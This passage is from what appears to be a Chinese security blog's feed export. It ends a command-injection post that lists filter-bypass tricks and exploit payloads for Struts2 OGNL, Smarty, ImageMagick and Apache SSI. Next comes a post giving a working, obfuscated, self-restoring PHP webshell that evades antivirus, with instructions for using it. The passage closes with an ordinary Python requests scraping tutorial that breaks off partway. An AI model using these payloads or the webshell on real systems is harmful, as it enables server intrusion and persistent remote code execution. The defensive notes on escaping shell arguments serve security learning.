class="line">appledeMacBook-Pro:~ apple$ echo$IFS$9&quot;111&quot;;</span><br><span class="line">111</span><br><span class="line">appledeMacBook-Pro:~ apple$ echo$&#123;IFS&#125;&quot;111&quot;</span><br><span class="line">111</span><br></pre></td></tr></table></figure></li></ul></li><li><p>敏感字符绕过</p><ul><li><p>利用变量绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ a&#x3D;c;b&#x3D;a;c&#x3D;t;</span><br><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ $a$b$c 1.txt</span><br><span class="line">abc</span><br></pre></td></tr></table></figure></li><li><p>利用base编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ echo &#39;cat&#39; | base64</span><br><span class="line">Y2F0Cg&#x3D;&#x3D;</span><br><span class="line">ubuntu@VM-0-8-ubuntu:~&#x2F;shell$ &#96;echo &#39;Y2F0Cg&#x3D;&#x3D;&#39; | base64 -d&#96; 1.txt</span><br><span class="line">abc</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h3><h5 id="Smarty-lt-3-1-32-php代码执行"><a href="#Smarty-lt-3-1-32-php代码执行" class="headerlink" title="Smarty &lt;= 3.1.32 php代码执行"></a>Smarty &lt;= 3.1.32 php代码执行</h5><p>产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行。</p><p>利用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure><h5 id="Struts2命令执行"><a href="#Struts2命令执行" class="headerlink" title="Struts2命令执行"></a>Struts2命令执行</h5><p>产生原因：产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行</p><p>利用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nikenb&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;cat &#x2F;etc&#x2F;passwd&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><h5 id="ImageMagick-命令执行"><a href="#ImageMagick-命令执行" class="headerlink" title="ImageMagick 命令执行"></a>ImageMagick 命令执行</h5><p>产生原因：</p><p>ImageMagick内置了非常多的图像处理库,通过系统的 system() 命令来调用外部的 lib 进行处理。调用外部 lib 的过程是使用系统的 system 命令来执行的，导致命令执行的代码。</p><p>利用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><h5 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h5><p>产生原因：上传含有命令执行指令的shtml文件，可以导致命令执行。</p><p>利用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?-- cmd&#x3D;&quot;cat &#x2F;root&#x2F;flag.txt&quot;--?&gt;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h4><ul><li><p>指定黑名单，禁止使用各种危险命令、或者危险函数，并在php.ini中配置disable_functions。</p></li><li><p>程序参数可控的情况下使用escapeshellcmd() </p><p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p><p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p><p>程序参数值可控的情况下使用escapeshellarg()</p><p>确保传递给命令安全的参数。</p><p>二者区别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg</span><br><span class="line">1.确保用户只传递一个参数给命令</span><br><span class="line">2.用户不能指定更多的参数一个</span><br><span class="line">3.用户不能执行不同的命令</span><br><span class="line">escapeshellcmd</span><br><span class="line">1.确保用户只执行一个命令</span><br><span class="line">2.用户可以指定不限数量的参数</span><br><span class="line">3.用户不能执行不同的命令</span><br></pre></td></tr></table></figure></li></ul><h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>eval()函数与system()函数的区别</p><ul><li>前者是执行一段代码，而不是命令，需要加分号。后者执行的是系统命令，而不是一段php代码。</li></ul>]]></content>
      
      
      <categories>
          
          <category> OWASP-TOP10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWSP-TOP10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPSHELL-bypass</title>
      <link href="2018/12/08/PHP%E6%9C%A8%E9%A9%AC/"/>
      <url>2018/12/08/PHP%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP免杀学习"><a href="#PHP免杀学习" class="headerlink" title="PHP免杀学习"></a>PHP免杀学习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set**time**limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ignore**user**abort(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$shell =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">file_put_contents($file,base64_decode($shell));</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>PHP中的ignore_user_abort函数是当用户关掉终端后脚本不停止仍然在执行，可以用它来实现计划任务与持续进程。</p></li><li><p>set_time_limit(0); </p><p>括号里边的数字是执行时间，如果为零说明永久执行直到程序结束，如果为大于零的数字，则不管程序是否执行完成，到了设定的秒数，程序结束。 </p></li><li><p>在PHP中暂停代码执行一定时间，有两个函数可以实现，一个是sleep()，另一个是usleep()，它们参数都是一个整数值。sleep()是暂停多少秒，usleep()是暂停多少<strong>微秒</strong>。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str1 = <span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;</span>;</span><br><span class="line">$str2 = strtr($str1,<span class="keyword">array</span>(<span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;</span>=&gt;<span class="string">&#x27;as&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)&#x27;</span>=&gt;<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;r&amp;%F%*^G*t&#x27;</span>=&gt;<span class="string">&#x27;rt&#x27;</span>));</span><br><span class="line">$str3 = strtr($str2,<span class="keyword">array</span>(<span class="string">&#x27;s,&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;</span>=&gt;<span class="string">&#x27;er&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(md5(@$_GET[<span class="string">&#x27;a&#x27;</span>]) ==<span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>)&#123;</span><br><span class="line">$str4 = strrev($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">$str5 = strrev($str4);</span><br><span class="line">$str3($str5);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>e10adc3949ba59abbe56e057f20f883e==123456</p></li><li><p>strrev反转字符串</p></li><li><p>strtr() 函数转换字符串中特定的字符。</p></li><li><p>关于三个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ php -r <span class="string">&quot;print(strtr(&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;,array(&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;=&gt;&#x27;as&#x27;,&#x27;fdgdefjg0J)&#x27;=&gt;&#x27;se&#x27;,&#x27;r&amp;%F%*^G*t&#x27;=&gt;&#x27;rt&#x27;)));&quot;</span></span><br><span class="line">assert</span><br></pre></td></tr></table></figure></li><li><p>最后得到assert($_POST[‘a’])</p></li></ul><p>最后post数据a=代码，访问phpinfo.php?a=123456。</p>]]></content>
      
      
      <categories>
          
          <category> By-pass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> By-pass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--Python爬虫基础</title>
      <link href="2018/12/07/Python%E7%88%AC%E8%99%AB/"/>
      <url>2018/12/07/Python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h3><h3 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h3><h5 id="Get请求"><a href="#Get请求" class="headerlink" title="Get请求"></a>Get请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带参数的GET请求,timeout请求超时时间</span></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;java&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#发送get请求并带上参数以及请求头,设置超时时间。</span></span><br><span class="line">r = requests.get(url=<span class="string">&#x27;http://baidu.com&#x27;</span>,headers=headers,params=params, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意观察url地址，它已经将参数拼接起来</span></span><br><span class="line">print(<span class="string">&#x27;URL地址：&#x27;</span>, r.url)</span><br><span class="line"><span class="comment"># 响应状态码，成功返回200，失败40x或50x。</span></span><br><span class="line">print(<span class="string">&#x27;请求状态码：&#x27;</span>, r.status_code)</span><br><span class="line">print(<span class="string">&#x27;header信息:&#x27;</span>, r.headers)</span><br><span class="line">print(<span class="string">&#x27;cookie信息：&#x27;</span>, r.cookies)</span><br><span class="line"><span class="comment">#返回响应数据,html内容。</span></span><br><span class="line">print(<span class="string">&#x27;响应的数据：&#x27;</span>, r.text)</span><br><span class="line"><span class="comment"># 如响应是json数据 ，可以使用 r.json()自动转换为dict</span></span><br><span class="line">print(<span class="string">&#x27;响应json数据&#x27;</span>, r.json())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">URL地址： http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java</span><br><span class="line">请求状态码： 200</span><br><span class="line">header信息: &#123;&#39;Date&#39;: &#39;Mon, 28 Sep 2020 07:02:06 GMT&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;, &#39;Content-Length&#39;: &#39;373&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Server&#39;: &#39;gunicorn&#x2F;19.9.0&#39;, &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;, &#39;Access-Control-Allow-Credentials&#39;: &#39;true&#39;&#125;</span><br><span class="line">cookie信息： &lt;RequestsCookieJar[]&gt;</span><br><span class="line">响应的数据： &#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;key1&quot;: &quot;python&quot;,</span><br><span class="line">    &quot;key2&quot;: &quot;java&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;,</span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;origin&quot;: &quot;111.14.212.75&quot;,</span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">响应json数据 &#123;&#39;args&#39;: &#123;&#39;key1&#39;: &#39;python&#39;, &#39;key2&#39;: &#39;java&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;python-requests&#x2F;2.23.0&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&#39;&#125;, &#39;origin&#39;: &#39;111.14.212.75&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&#39;&#125;</span><br></pre></td></tr></table></figure><h5 id="Post请求"><a href="#Post请求" class="headerlink" title="Post请求"></a>Post请求</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">     <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">     <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># 如果是json数据，直接可以调用json方法</span></span><br><span class="line">print(resp.json())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;status&#39;: False, &#39;msg&#39;: &#39;请求成功!&#39;, &#39;clientIp&#39;: &#39;111.14.212.75&#39;, &#39;state&#39;: 2402&#125;</span><br></pre></td></tr></table></figure><h5 id="随机浏览器头"><a href="#随机浏览器头" class="headerlink" title="随机浏览器头"></a>随机浏览器头</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line">ua = UserAgent()</span><br><span class="line">ua.update()  <span class="comment"># 更新用户代理列表</span></span><br><span class="line"> </span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: ua.random&#125;</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">&#x27;http://steady.net&#x27;</span>, headers=headers)</span><br></pre></td></tr></table></figure><h5 id="Get请求与Post请求设置代理"><a href="#Get请求与Post请求设置代理" class="headerlink" title="Get请求与Post请求设置代理"></a>Get请求与Post请求设置代理</h5><p>使用<code>requests</code>添加代理也非常简单，只要在请求的方法中（比如<code>get</code>或者<code>post</code>）传递<code>proxies</code>参数就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><h5 id="处理请求包"><a href="#处理请求包" class="headerlink" title="处理请求包"></a>处理请求包</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line">respone=requests.get(<span class="string">&quot;http://baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(respone.headers)</span><br><span class="line"></span><br><span class="line">print(respone.headers[<span class="string">&#x27;Server&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python3 <span class="number">1.</span>py</span><br><span class="line">&#123;<span class="string">&#x27;Date&#x27;</span>: <span class="string">&#x27;Mon, 28 Sep 2020 07:20:24 GMT&#x27;</span>, <span class="string">&#x27;Server&#x27;</span>: <span class="string">&#x27;Apache&#x27;</span>, <span class="string">&#x27;Last-Modified&#x27;</span>: <span class="string">&#x27;Tue, 12 Jan 2010 13:48:00 GMT&#x27;</span>, <span class="string">&#x27;ETag&#x27;</span>: <span class="string">&#x27;&quot;51-47cf7e6ee8400&quot;&#x27;</span>, <span class="string">&#x27;Accept-Ranges&#x27;</span>: <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=86400&#x27;</span>, <span class="string">&#x27;Expires&#x27;</span>: <span class="string">&#x27;Tue, 29 Sep 2020 07:20:24 GMT&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>&#125;</span><br><span class="line">Apache</span><br></pre></td></tr></table></figure><ul><li>respone.headers请求包的请求头，返回值是一个字典。</li><li>通过对字典操作，取出对应的请求头。</li></ul><h5 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line">respone=requests.get(<span class="string">&quot;http://sss.com&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(respone.reason)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectTimeout: HTTPConnectionPool(host=<span class="string">&#x27;sss.com&#x27;</span>, port=<span class="number">80</span>): Max retries exceeded <span class="keyword">with</span> url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at <span class="number">0x10f118550</span>&gt;, <span class="string">&#x27;Connection to sss.com timed out. (connect timeout=1)&#x27;</span>))</span><br></pre></td></tr></table></figure><p>timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out。</p><h5 id="cookie操作"><a href="#cookie操作" class="headerlink" title="cookie操作"></a>cookie操作</h5><p>获取cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&quot;https://www.csdn.net&quot;</span>)</span><br><span class="line">print(type(r.cookies), r.cookies)</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> r.cookies.items():</span><br><span class="line">    print(key + <span class="string">&#x27;=&#x27;</span> + value)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#39;requests.cookies.RequestsCookieJar&#39;&gt; &lt;RequestsCookieJar[&lt;Cookie dc_session_id&#x3D;10_1575798031732.659641 for .csdn.net&#x2F;&gt;, &lt;Cookie uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184 for .csdn.net&#x2F;&gt;, &lt;Cookie acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 for www.csdn.net&#x2F;&gt;]&gt;</span><br><span class="line">dc_session_id&#x3D;10_1575798031732.659641</span><br><span class="line">uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184</span><br><span class="line">acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1</span><br></pre></td></tr></table></figure><p>在 Requests 中我们使用 <code>cookies</code> 属性就可以直接得到 Cookies 。通过打印我们可以发现它的类型是 <code>requests.cookies.RequestsCookieJar</code> ，然后用 <code>items()</code> 方法将其转化为元组组成的列表，遍历输出每一个 Cookie 的名称和值，实现 Cookie 的遍历解析。</p><p>共享cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 